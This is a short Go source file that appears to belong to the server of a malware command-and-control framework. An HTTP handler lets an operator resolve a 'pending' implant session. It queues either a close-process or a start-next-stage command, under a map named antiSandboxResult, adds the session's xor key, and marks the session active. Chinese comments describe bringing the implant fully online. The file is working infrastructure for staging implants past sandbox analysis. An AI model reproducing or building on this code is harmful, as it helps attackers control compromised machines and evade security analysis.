package ToolBar

import (
	"Server/SessionController"
	"github.com/gin-gonic/gin"
)

type PendingSession struct{}

var antiSandboxResult = map[string][]byte{
	"CloseProcess":   []byte("0"),
	"StartNextStage": []byte("1"),
}

// 下发待定会话命令数据
func (p PendingSession) SetPendingSessionCommand(username string, c *gin.Context) {
	// 构造命令数据: 进入正式上线阶段 / 关闭进程
	commandData := SessionController.ConstructCommandData([]byte("0"), append(antiSandboxResult[c.PostForm("command")], []byte(SessionController.PartPendingSessionInfoMap[c.PostForm("sid")]["xor"])...))
	// 命令数据 -> 命令数据字典
	SessionController.CommandDataMap[c.PostForm("sid")] = append(SessionController.CommandDataMap[c.PostForm("sid")], commandData)
	// 更新待定会话信息: 不再是待定状态
	SessionController.PartPendingSessionInfoMap[c.PostForm("sid")]["pending"] = "false"
	c.String(200, "success")
}
